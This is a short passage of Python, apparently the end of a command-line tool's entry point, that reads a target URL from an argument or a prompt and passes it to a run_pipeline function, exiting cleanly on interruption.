        target = sys.argv[1]
    else:
        target = input("\n\033[94m[?] Target (e.g. https://example.com): \033[0m")
    try:
        run_pipeline(target)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting.")
